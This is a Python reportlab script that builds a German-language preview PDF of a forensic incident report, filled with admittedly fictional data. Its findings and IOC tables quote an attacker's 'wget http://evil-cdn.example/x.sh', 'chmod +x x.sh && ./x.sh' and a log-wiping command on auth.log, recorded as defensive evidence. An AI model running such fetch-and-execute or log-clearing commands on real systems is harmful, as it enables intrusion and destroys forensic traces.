#!/usr/bin/env python3
"""Generator fuer die Report-Redesign-Vorschau (Design-System "Ink & Steel").

Erzeugt docs/report_redesign_vorschau.pdf mit fiktiven Skunkworks-Daten.
Dient als Design-Referenz fuer den echten stage14-Umbau (nach Abgabe).
"""
from reportlab.lib.pagesizes import A4
from reportlab.lib.units import mm
from reportlab.lib import colors
from reportlab.platypus import (BaseDocTemplate, PageTemplate, Frame, Paragraph,
                                Spacer, Table, TableStyle, PageBreak, HRFlowable,
                                KeepTogether, NextPageTemplate)
from reportlab.lib.styles import ParagraphStyle

INK   = colors.HexColor('#1A2632')
STEEL = colors.HexColor('#2E5E8C')
SLATE = colors.HexColor('#5C6670')
MIST  = colors.HexColor('#F4F7FA')
LINE  = colors.HexColor('#DCE4EC')
SEVC  = {'CRITICAL': '#B23A32', 'HIGH': '#B97E22', 'MEDIUM': '#6B7280', 'INFO': '#3F7253'}

PW, PH = A4
ML = 22 * mm
W  = PW - 2 * ML
NBSP = ' '


def st(n, **kw):
    b = dict(fontName='Helvetica', fontSize=9.5, leading=14.5, textColor=INK)
    b.update(kw)
    return ParagraphStyle(n, **b)


S_TITLE = st('ti', fontName='Helvetica-Bold', fontSize=30, leading=37)
S_SUB   = st('su', fontSize=12, textColor=SLATE, leading=17)
S_BODY  = st('bo', textColor=colors.HexColor('#2A333D'))
S_LEAD  = st('le', fontSize=10.5, leading=17, textColor=colors.HexColor('#2A333D'))
S_SMALL = st('sm', fontSize=7.5, leading=10.5, textColor=SLATE)
S_LABEL = st('la', fontName='Helvetica-Bold', fontSize=6.8, leading=9, textColor=SLATE)
S_HDR   = st('hd', fontName='Helvetica-Bold', fontSize=7, leading=9, textColor=SLATE)
S_KPI_N = st('kn', fontName='Helvetica-Bold', fontSize=20, leading=23)
S_CELL  = st('ce', fontSize=8.6, leading=12, textColor=colors.HexColor('#2A333D'))
S_CELLR = st('cr', fontSize=8.6, leading=12, textColor=colors.HexColor('#2A333D'), alignment=2)


def label(text):
    return Paragraph(text.upper().replace(' ', NBSP), S_LABEL)


def hdr(text):
    return Paragraph(text.upper().replace(' ', NBSP), S_HDR)


def h1(num, title):
    t = Table([[Paragraph(f'<font size="19" color="#2E5E8C"><b>{num}</b></font>', S_BODY),
                Paragraph(f'<font size="14" color="#1A2632"><b>{title}</b></font>', S_BODY)]],
              colWidths=[13 * mm, W - 13 * mm])
    t.setStyle(TableStyle([('VALIGN', (0, 0), (-1, -1), 'BOTTOM'),
                           ('LINEBELOW', (0, 0), (-1, -1), 0.75, LINE),
                           ('BOTTOMPADDING', (0, 0), (-1, -1), 5),
                           ('LEFTPADDING', (0, 0), (-1, -1), 0)]))
    return [t, Spacer(1, 5 * mm)]


def h2(text):
    return Paragraph(f'<font size="10.5"><b>{text}</b></font>', S_BODY)


def sev(level):
    return Paragraph(f'<font color="{SEVC[level]}" size="7">●</font>'
                     f'{NBSP}<font size="7" color="{SEVC[level]}"><b>{level}</b></font>', S_SMALL)


def nowrap(text):
    """Inhalt einzeilig halten (Zeiten, IDs): Spaces -> NBSP."""
    return str(text).replace(' ', NBSP)


def tbl(data, widths, sev_col=None, right_cols=(), nowrap_cols=()):
    rows = []
    for r, row in enumerate(data):
        out = []
        for ci, cell in enumerate(row):
            if r == 0:
                out.append(hdr(str(cell)))
            elif sev_col is not None and ci == sev_col:
                out.append(sev(str(cell)))
            elif ci in right_cols:
                out.append(Paragraph(nowrap(cell) if ci in nowrap_cols else str(cell), S_CELLR))
            else:
                out.append(Paragraph(nowrap(cell) if ci in nowrap_cols else str(cell), S_CELL))
        rows.append(out)
    t = Table(rows, colWidths=widths, repeatRows=1)
    t.setStyle(TableStyle([
        ('LINEBELOW', (0, 0), (-1, 0), 1.1, STEEL),
        ('LINEBELOW', (0, 1), (-1, -2), 0.5, LINE),
        ('TOPPADDING', (0, 0), (-1, 0), 2), ('BOTTOMPADDING', (0, 0), (-1, 0), 5),
        ('TOPPADDING', (0, 1), (-1, -1), 5), ('BOTTOMPADDING', (0, 1), (-1, -1), 5),
        ('LEFTPADDING', (0, 0), (-1, -1), 2), ('RIGHTPADDING', (0, 0), (-1, -1), 8),
        ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
    ]))
    return t


def beilage(text):
    t = Table([[Paragraph(f'<font size="8" color="#2E5E8C"><b>→{NBSP}{NBSP}BEILAGE</b></font>'
                          f'<font size="8" color="#2A333D">{NBSP}{NBSP}{text}</font>', S_SMALL)]],
              colWidths=[W])
    t.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, -1), MIST),
                           ('LINEBEFORE', (0, 0), (0, -1), 1.6, STEEL),
                           ('TOPPADDING', (0, 0), (-1, -1), 5.5), ('BOTTOMPADDING', (0, 0), (-1, -1), 5.5),
                           ('LEFTPADDING', (0, 0), (-1, -1), 9)]))
    return t


def prov(text):
    return Paragraph(f'<font size="7.2" color="#5C6670"><b>PROVENIENZ</b>{NBSP}{NBSP}·{NBSP}{NBSP}{text}</font>', S_SMALL)


def kpi_row(items):
    gap = 4 * mm
    cw  = (W - 3 * gap) / 4
    cards = []
    for num, lab in items:
        c = Table([[Paragraph(num, S_KPI_N)], [label(lab)]], colWidths=[cw - 12])
        c.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, -1), MIST),
                               ('LINEABOVE', (0, 0), (-1, 0), 1.8, STEEL),
                               ('TOPPADDING', (0, 0), (-1, 0), 8), ('BOTTOMPADDING', (0, 1), (-1, 1), 8),
                               ('BOTTOMPADDING', (0, 0), (-1, 0), 2),
                               ('LEFTPADDING', (0, 0), (-1, -1), 11)]))
        cards.append(c)
    row = Table([[cards[0], '', cards[1], '', cards[2], '', cards[3]]],
                colWidths=[cw, gap, cw, gap, cw, gap, cw])
    row.setStyle(TableStyle([('LEFTPADDING', (0, 0), (-1, -1), 0), ('RIGHTPADDING', (0, 0), (-1, -1), 0),
                             ('TOPPADDING', (0, 0), (-1, -1), 0), ('BOTTOMPADDING', (0, 0), (-1, -1), 0)]))
    return row


def finding(fid, title, level, erkenntnis, inner, prov_text, beilage_text):
    pill = Table([[sev(level)]], colWidths=[26 * mm])
    pill.setStyle(TableStyle([('BACKGROUND', (0, 0), (-1, -1), MIST),
                              ('TOPPADDING', (0, 0), (-1, -1), 3), ('BOTTOMPADDING', (0, 0), (-1, -1), 3),
                              ('LEFTPADDING', (0, 0), (-1, -1), 7)]))
    head = Table([[Paragraph(f'<font size="11"><b>{fid}{NBSP}{NBSP}{title}</b></font>', S_BODY), pill]],
                 colWidths=[W - 26 * mm - 14, 26 * mm])
    head.setStyle(TableStyle([('LEFTPADDING', (0, 0), (-1, -1), 0), ('VALIGN', (0, 0), (-1, -1), 'MIDDLE'),
                              ('BOTTOMPADDING', (0, 0), (-1, -1), 3)]))
    card = Table([[head], [Paragraph(erkenntnis, S_LEAD)], [Spacer(1, 3 * mm)], [inner],
                  [Spacer(1, 2.5 * mm)], [prov(prov_text)], [Spacer(1, 2 * mm)], [beilage(beilage_text)]],
                 colWidths=[W - 9])
    card.setStyle(TableStyle([('LINEBEFORE', (0, 0), (0, -1), 2.2, colors.HexColor(SEVC[level])),
                              ('LEFTPADDING', (0, 0), (-1, -1), 11),
                              ('TOPPADDING', (0, 0), (-1, -1), 1), ('BOTTOMPADDING', (0, 0), (-1, -1), 1)]))
    return KeepTogether(card)


def _later(canv, doc):
    canv.saveState()
    canv.setStrokeColor(LINE); canv.setLineWidth(0.6)
    canv.line(ML, PH - 14 * mm, PW - ML, PH - 14 * mm)
    canv.setFillColor(SLATE)
    canv.setFont('Helvetica-Bold', 6.5)
    t = canv.beginText(ML, PH - 12 * mm); t.setCharSpace(1.6); t.textOut('FALL SKW-2026-001'); canv.drawText(t)
    txt = 'VERTRAULICH'
    wdt = canv.stringWidth(txt, 'Helvetica-Bold', 6.5) + 1.6 * len(txt)
    t = canv.beginText(PW - ML - wdt, PH - 12 * mm); t.setCharSpace(1.6); t.textOut(txt); canv.drawText(t)
    canv.line(ML, 13 * mm, PW - ML, 13 * mm)
    canv.setFont('Helvetica', 7)
    canv.drawString(ML, 9.5 * mm, 'DFIR-Pipeline v3.0 — Forensischer Analysebericht')
    canv.drawRightString(PW - ML, 9.5 * mm, f'Seite {doc.page}')
    canv.restoreState()


def _first(canv, doc):
    canv.saveState()
    canv.setFillColor(STEEL); canv.setFont('Helvetica-Bold', 7)
    t = canv.beginText(ML, PH - 22 * mm); t.setCharSpace(2.2)
    t.textOut('DFIR-PIPELINE V3.0'); canv.drawText(t)
    canv.setFillColor(SLATE)
    t = canv.beginText(ML + 62 * mm, PH - 22 * mm); t.setCharSpace(2.2)
    t.textOut('·   DIGITALE FORENSIK'); canv.drawText(t)
    canv.restoreState()


def build(ziel='docs/report_redesign_vorschau.pdf'):
    doc = BaseDocTemplate(ziel, pagesize=A4,
                          leftMargin=ML, rightMargin=ML, topMargin=20 * mm, bottomMargin=18 * mm,
                          title='Report-Redesign Vorschau v3.1')
    frame  = Frame(ML, 18 * mm, W, PH - 40 * mm, id='f')
    framec = Frame(ML, 18 * mm, W, PH - 44 * mm, id='fc')
    doc.addPageTemplates([PageTemplate(id='cover', frames=[framec], onPage=_first),
                          PageTemplate(id='page',  frames=[frame],  onPage=_later)])

    story = []

    # Deckblatt
    story += [Spacer(1, 56 * mm),
        HRFlowable(width=26 * mm, thickness=2.6, color=STEEL, hAlign='LEFT'),
        Spacer(1, 7 * mm),
        Paragraph('Forensischer<br/>Analysebericht', S_TITLE),
        Spacer(1, 5 * mm),
        Paragraph(f'Fall SKW-2026-001{NBSP}{NBSP}·{NBSP}{NBSP}Vorfall „Skunkworks"', S_SUB),
        Spacer(1, 27 * mm)]
    meta = [['Beweismittel', '2 Disk-Images — jumpbox.E01, webserver.E01'],
            ['Analysezeitraum', '11.06.2026, 14:10 – 15:42 UTC'],
            ['Analyst', 'M. Pomarico'],
            ['Bericht erstellt', '11.06.2026, 15:42 UTC']]
    mt = Table([[label(k), Paragraph(v, S_BODY)] for k, v in meta],
               colWidths=[42 * mm, W - 42 * mm])
    mt.setStyle(TableStyle([('LINEBELOW', (0, 0), (-1, -2), 0.5, LINE),
                            ('TOPPADDING', (0, 0), (-1, -1), 5.5), ('BOTTOMPADDING', (0, 0), (-1, -1), 5.5),
                            ('LEFTPADDING', (0, 0), (-1, -1), 0), ('VALIGN', (0, 0), (-1, -1), 'MIDDLE')]))
    story += [mt, Spacer(1, 26 * mm),
        Table([[Paragraph(f'<font size="7.5" color="#B23A32"><b>VORSCHAU{NBSP}/{NBSP}ENTWURF</b></font>'
                          f'<font size="7.5" color="#5C6670">{NBSP}{NBSP}—{NBSP}{NBSP}fiktive Daten · Konzept Report-Redesign v3.1</font>', S_SMALL)]],
              colWidths=[W],
              style=TableStyle([('LINEABOVE', (0, 0), (-1, 0), 0.6, LINE),
                                ('TOPPADDING', (0, 0), (-1, -1), 7), ('LEFTPADDING', (0, 0), (-1, -1), 0)])),
        NextPageTemplate('page'), PageBreak()]

    # Inhalt
    story += h1('—', 'Inhalt')
    toc = [('01', 'Management Summary', '3'), ('02', 'Beweismittel & Integrität', '3'),
           ('03', 'Systemüberblick je Image', '4'), ('04', 'Forensische Erkenntnisse', '5'),
           ('05', 'Rekonstruierte Timeline', '6'), ('06', 'Indikatoren (IOCs)', '6'),
           ('07', 'Methodik & Grenzen', '6'), ('D', 'Anhang — Pipeline-Ausführungsprotokoll', '7'),
           ('S', 'Design-Styleguide', '8')]
    tt = Table([[Paragraph(f'<font size="10" color="#2E5E8C"><b>{n}</b></font>', S_BODY),
                 Paragraph(t, st('toct', fontSize=10.5)),
                 Paragraph(f'<font color="#5C6670">{p}</font>', st('tocp', fontSize=10, alignment=2))]
                for n, t, p in toc],
               colWidths=[13 * mm, W - 13 * mm - 12 * mm, 12 * mm])
    tt.setStyle(TableStyle([('LINEBELOW', (0, 0), (-1, -2), 0.5, LINE),
                            ('TOPPADDING', (0, 0), (-1, -1), 6.5), ('BOTTOMPADDING', (0, 0), (-1, -1), 6.5),
                            ('LEFTPADDING', (0, 0), (-1, -1), 0)]))
    story += [tt, PageBreak()]

    # 01 Summary
    story += h1('01', 'Management Summary')
    story += [kpi_row([('2', 'Beweismittel'), ('214.508', 'Ereignisse'), ('5', 'Befunde'), ('1.847', 'IOCs')]),
        Spacer(1, 6 * mm),
        Paragraph('Am <b>01.05.2024 zwischen 14:02 und 14:25 UTC</b> erfolgte ein unautorisierter Zugriff. '
            'Der Angreifer meldete sich von <b>10.0.0.9</b> per SSH an der Jumpbox an (Konto „admin"), '
            'wechselte auf den Webserver und lud dort ein Schadskript von <b>evil-cdn.example</b> nach. '
            'Anschließend wurden Spuren beseitigt: <b>/var/log/auth.log wurde geleert</b> (Befund A-01). '
            'Die Integrität der Beweismittel ist über eingebettete E01-Hashes belegt (Abschnitt 02).', S_LEAD),
        Spacer(1, 9 * mm)]

    # 02 Beweismittel
    story += h1('02', 'Beweismittel & Integrität')
    story += [tbl([['#', 'Image', 'Betriebssystem', 'Hostname', 'Größe'],
        ['1', 'jumpbox.E01', 'Ubuntu 22.04.3 LTS', 'jumpbox', '12.4 GB'],
        ['2', 'webserver.E01', 'CentOS Linux 7 (Core)', 'web01', '38.1 GB']],
        [8 * mm, 40 * mm, 52 * mm, 28 * mm, W - 128 * mm], right_cols={4}, nowrap_cols={4}),
        Spacer(1, 5 * mm),
        h2('Hash-Verifikation — vollständig, keine Kürzung'), Spacer(1, 2.5 * mm),
        tbl([['Image', 'Verfahren', 'Wert'],
        ['jumpbox.E01', 'MD5 · E01', '3a7bd3e2360a3d29eea436fcfb7e44c1'],
        ['jumpbox.E01', 'SHA1 · E01', 'da39a3ee5e6b4b0d3255bfef95601890afd80709'],
        ['webserver.E01', 'MD5 · E01', '9e107d9d372bb6826bd81d3542a419d6']],
        [34 * mm, 26 * mm, W - 60 * mm], nowrap_cols={1}),
        Spacer(1, 2.5 * mm),
        prov('Beim Imaging eingebettet (EnCase), via TSK img_stat ausgelesen. Verifikation: --verify-image-hash.'),
        PageBreak()]

    # 03 Systeme
    story += h1('03', 'Systemüberblick je Image')
    for name, rows in [
      ('jumpbox.E01', [
        ['Betriebssystem', 'Ubuntu 22.04.3 LTS', '/etc/os-release'],
        ['Kernel', '5.15.0-91-generic', '/boot/vmlinuz-* + GRUB'],
        ['Machine-ID', 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4', '/etc/machine-id · icat'],
        ['/etc/shadow geändert', '2024-04-30 10:14:02 UTC', 'istat · Partition 2, offset 2048'],
        ['Reguläre Nutzer', 'admin (UID 1000, sudo) · deploy (UID 1001)', '/etc/passwd + sudoers']]),
      ('webserver.E01', [
        ['Betriebssystem', 'CentOS Linux 7 (Core)', '/etc/redhat-release'],
        ['Kernel', '3.10.0-1160.el7', '/boot/vmlinuz-*'],
        ['Machine-ID', 'f9e8d7c6b5a4f9e8d7c6b5a4f9e8d7c6', '/var/lib/dbus/machine-id · icat'],
        ['/etc/shadow geändert', '<font color="#B23A32"><b>2024-05-01 14:18:55 UTC — im Angriffsfenster</b></font>', 'istat · Partition 2, offset 2048'],
        ['Reguläre Nutzer', 'webadmin (UID 1000) · <font color="#B23A32"><b>backup2 (UID 1002, neu angelegt)</b></font>', '/etc/passwd + auth.log']])]:
        story += [h2(name), Spacer(1, 2.5 * mm),
            tbl([['Merkmal', 'Wert', 'Quelle']] + rows, [37 * mm, W - 37 * mm - 52 * mm, 52 * mm]),
            Spacer(1, 7 * mm)]
    story.append(PageBreak())

    # 04 Befunde  (Zeit-Spalte 18mm + nowrap -> kein Umbruch in Uhrzeiten)
    story += h1('04', 'Forensische Erkenntnisse')
    story += [finding('K-01', 'Lateral Movement — Jumpbox → Webserver', 'CRITICAL',
        '<b>Erkenntnis</b> — Drei Minuten nach dem SSH-Login auf der Jumpbox wurde auf dem Webserver '
        'ein Schadskript geladen und ausgeführt. Zeitliche Nähe, identische Quell-IP und Sitzungskette '
        'belegen einen zusammenhängenden Angriffspfad.',
        tbl([['Zeit', 'Image', 'Quelle', 'Ereignis', 'Schwere'],
            ['14:02:11', 'jumpbox', '/var/log/auth.log', 'SSH-Login admin von 10.0.0.9', 'MEDIUM'],
            ['14:03:48', 'jumpbox', '~admin/.bash_history', 'ssh webadmin@10.0.2.20', 'MEDIUM'],
            ['14:05:43', 'webserver', '/root/.bash_history', 'wget http://evil-cdn.example/x.sh', 'HIGH'],
            ['14:05:51', 'webserver', '/root/.bash_history', 'chmod +x x.sh && ./x.sh', 'CRITICAL'],
            ['14:06:02', 'webserver', 'mactime', '/tmp/x.sh angelegt · 4.812 Bytes', 'HIGH']],
            [18 * mm, 19 * mm, 36 * mm, W - 18 * mm - 19 * mm - 36 * mm - 23 * mm - 11, 23 * mm],
            sev_col=4, nowrap_cols={0}),
        'TSK icat · Partition 2 (offset 2048) · Datei-Hashes im Manifest, Anhang C · 5 von 38 Ereignissen gezeigt.',
        f'<b>reboot_sessions.xlsx</b> · Mappe <i>Reboot_3</i> · Filter „Quelle"{NBSP}={NBSP}[webserver.E01] · alle 38 Events'),
      Spacer(1, 8 * mm),
      finding('A-01', 'Log-Manipulation auf web01', 'CRITICAL',
        '<b>Erkenntnis</b> — /var/log/auth.log wurde um 14:24:37 UTC geleert (0 Bytes, mtime im '
        'Angriffsfenster). Die wtmp-Datenbank blieb unberührt — die Logins sind darüber rekonstruierbar; '
        'der Konsistenz-Check (wtmp vs. auth) schlug an.',
        tbl([['Indikator', 'Wert', 'Quelle'],
            ['auth.log — Größe / mtime', '0 Bytes · 14:24:37 UTC', 'istat'],
            ['Shell-Befehl', '&gt; /var/log/auth.log', '/root/.bash_history'],
            ['wtmp- vs. auth-Logins', '7 vs. 0', 'Konsistenz-Check Stage 9']],
            [48 * mm, 48 * mm, W - 96 * mm - 11]),
        'webserver.E01 · Partition 2 (offset 2048) · istat + icat.',
        '<b>antiforensics.json</b> · YARA-Details: Anhang C'),
      PageBreak()]

    # 05/06/07
    story += h1('05', 'Rekonstruierte Timeline — Schlüsselereignisse')
    story += [tbl([['Zeit (UTC)', 'Image', 'Ereignis', 'Schwere'],
        ['30.04. 10:14', 'jumpbox', 'Letzte legitime Passwortänderung (admin)', 'INFO'],
        ['01.05. 13:58', 'jumpbox', '3× fehlgeschlagener SSH-Login von 10.0.0.9', 'MEDIUM'],
        ['01.05. 14:02', 'jumpbox', 'SSH-Login admin erfolgreich', 'MEDIUM'],
        ['01.05. 14:05', 'webserver', 'Download und Ausführung von x.sh', 'CRITICAL'],
        ['01.05. 14:18', 'webserver', 'Nutzer „backup2" angelegt — Persistenz', 'CRITICAL'],
        ['01.05. 14:24', 'webserver', 'auth.log geleert — Anti-Forensik', 'CRITICAL'],
        ['01.05. 14:25', 'jumpbox', 'SSH-Session beendet', 'INFO']],
        [26 * mm, 22 * mm, W - 26 * mm - 22 * mm - 23 * mm, 23 * mm], sev_col=3, nowrap_cols={0}),
      Spacer(1, 2.5 * mm),
      beilage('Vollständige Timeline — 214.508 Events, beide Images: <b>timeline.xlsx</b> + <b>activity_timeline.csv</b> · interaktiv: Timesketch'),
      Spacer(1, 9 * mm)]
    story += h1('06', 'Indikatoren (IOCs) — Auszug')
    story += [tbl([['Typ', 'Wert', 'Kontext', 'Image'],
        ['ip', '10.0.0.9', 'SSH-Quelle des Angriffs', 'beide'],
        ['url', 'http://evil-cdn.example/x.sh', 'Schadskript-Download', 'webserver'],
        ['sha256', 'c4f7d2… vollständig in Beilage', 'x.sh — aus Manifest', 'webserver']],
        [16 * mm, 60 * mm, 48 * mm, W - 124 * mm]),
      Spacer(1, 2.5 * mm),
      beilage('Alle 1.847 IOCs — 312 ip_private separat ausgewiesen: <b>iocs.json</b> / <b>iocs.xlsx</b>'),
      Spacer(1, 9 * mm)]
    story += h1('07', 'Methodik & Grenzen')
    story += [Paragraph('Vollautomatisierte Analyse mit DFIR-Pipeline v3.0 im Fall-Modus (2 Images): Beweissicherung, '
        'Partition-Layout, System-Profiling, TSK-Extraktion mit Manifest, 38 Log-Parser inkl. Journal und wtmpdb, '
        'IOC-Extraktion, UTC-Normalisierung, Anti-Forensik und YARA, Timeline-Analyse, Export. '
        '<b>Grenzen</b> — Logdateien über 50 MB wurden partiell gelesen (--max-read-mb 50; zwei Dateien, im '
        'Protokoll vermerkt). RAM-Analyse deaktiviert (kein Speicherabbild vorhanden). Jahresinferenz '
        'jahresloser Syslog-Zeitstempel über die Datei-mtime.', S_BODY),
      PageBreak()]

    # Anhang D
    story += h1('D', 'Anhang — Pipeline-Ausführungsprotokoll')
    story += [Paragraph('Wiedergabe der Stage-Übersichten aus der Pipeline-Ausführung — je Image für die '
        'Erfassungsstufen, gemeinsam für die Analyse. Inhaltlich identisch zu den Terminal-Panels.', S_BODY),
        Spacer(1, 5 * mm),
        h2('D.1 · Stage 01 — Dateierkennung & Beweissicherung — jumpbox.E01'), Spacer(1, 2.5 * mm),
        tbl([['Feld', 'Wert'],
            ['Format', 'E01 (EWF)'], ['Größe komprimiert / logisch', '12.40 GB / 20.00 GB'],
            ['MD5', '3a7bd3e2360a3d29eea436fcfb7e44c1'],
            ['SHA1', 'da39a3ee5e6b4b0d3255bfef95601890afd80709'],
            ['Hash-Quelle', 'E01-eingebettet']], [52 * mm, W - 52 * mm]),
        Spacer(1, 6 * mm),
        h2('D.2 · Stage 02 — Partition-Layout — jumpbox.E01'), Spacer(1, 2.5 * mm),
        tbl([['#', 'Offset', 'Dateisystem', 'Rolle', 'Tool', 'OS erkannt'],
            ['1', '2048', 'fat32', 'BOOT', 'tsk', '—'],
            ['2', '1050624', 'ext4', 'ROOT/DATA', 'tsk', 'Ubuntu 22.04.3 LTS']],
            [8 * mm, 22 * mm, 26 * mm, 26 * mm, 16 * mm, W - 98 * mm], right_cols={1}),
        Spacer(1, 6 * mm),
        h2('D.3 · Stage 05 — Disk-Forensik (TSK) — jumpbox.E01'), Spacer(1, 2.5 * mm),
        tbl([['Kennzahl', 'Wert'],
            ['Log-Dateien extrahiert', '138'],
            ['Gelöscht gefunden / wiederhergestellt', '47 / 39'],
            ['MACtime-Events', '89.214']], [70 * mm, W - 70 * mm], right_cols={1}),
        Spacer(1, 6 * mm),
        h2('D.4 · Stage 06 — Log-Parsing — gemeinsam, beide Images'), Spacer(1, 2.5 * mm),
        tbl([['Parser', 'Events', 'Quelle'],
            ['mactime', '142.038', '2 Images'], ['journald', '14.005', '*.journal'],
            ['kern', '1.757', '9 Dateien'], ['wtmpdb', '58', '/var/lib/wtmpdb/wtmp.db'],
            ['auth', '169', '/var/log/auth.log'], ['text_fallback', '312', '12 Dateien · Quote 0,1 %']],
            [32 * mm, 22 * mm, W - 54 * mm], right_cols={1}),
        Spacer(1, 2.5 * mm),
        prov('214.508 Events gesamt · 0 Fehler · Stage 13 Gesamtqualität: SEHR GUT'),
        PageBreak()]

    # Styleguide
    story += h1('S', 'Design-Styleguide „Ink & Steel"')
    gap = 4 * mm; cw = (W - 3 * gap) / 4
    sw = [('INK', '#1A2632', 'Titel · Text'), ('STEEL', '#2E5E8C', 'Akzent · Verweise'),
          ('SLATE', '#5C6670', 'Labels · Sekundär'), ('MIST', '#F4F7FA', 'Flächen · Karten')]
    cards = []
    for n, hx, use in sw:
        c = Table([[''], [Paragraph(f'<b>{n}</b>', st('swn', fontSize=8))],
                   [Paragraph(f'<font size="7" color="#5C6670">{hx}<br/>{use}</font>', S_SMALL)]],
                  colWidths=[cw], rowHeights=[15 * mm, None, None])
        c.setStyle(TableStyle([('BACKGROUND', (0, 0), (0, 0), colors.HexColor(hx)),
                               ('BOX', (0, 0), (0, 0), 0.5, LINE),
                               ('TOPPADDING', (0, 1), (0, 1), 5), ('LEFTPADDING', (0, 0), (-1, -1), 1)]))
        cards.append(c)
    swrow = Table([[cards[0], '', cards[1], '', cards[2], '', cards[3]]],
                  colWidths=[cw, gap, cw, gap, cw, gap, cw])
    swrow.setStyle(TableStyle([('LEFTPADDING', (0, 0), (-1, -1), 0), ('RIGHTPADDING', (0, 0), (-1, -1), 0)]))
    story += [Paragraph('Vier Kernfarben — mehr nicht. Schweregrade erscheinen ausschließlich als '
                        'Punkt-Marker, nie als Fläche:', S_BODY), Spacer(1, 4 * mm), swrow, Spacer(1, 5 * mm),
        Table([[sev('CRITICAL'), sev('HIGH'), sev('MEDIUM'), sev('INFO')]],
              colWidths=[W / 4] * 4, style=TableStyle([('LEFTPADDING', (0, 0), (-1, -1), 0)])),
        Spacer(1, 7 * mm),
        h2('Typografie & Regeln'), Spacer(1, 2.5 * mm),
        Paragraph('Helvetica durchgängig · Titel 30/Bold · Abschnittsnummern 19/Steel · Fließtext 9,5/14,5 · '
            'Labels 6,8 pt Versalien (Sperrung nur in Kopfzeilen, technisch über Zeichenabstand). '
            'Tabellen ohne Gitter — Kopf-Linie Steel 1,1 pt, Hairlines 0,5 pt; Zahlen rechtsbündig; '
            'Zellinhalte brechen sauber um, Zeiten/IDs bleiben einzeilig (NBSP). Befund-Karten mit '
            '2,2-pt-Schwere-Balken links und Severity-Pill. Beilagen-Verweise als Mist-Fläche mit '
            'Steel-Kante. Hashes immer vollständig.', S_BODY)]

    doc.build(story)
    return ziel


if __name__ == '__main__':
    ziel = build()
    print(f'Vorschau erzeugt: {ziel}')
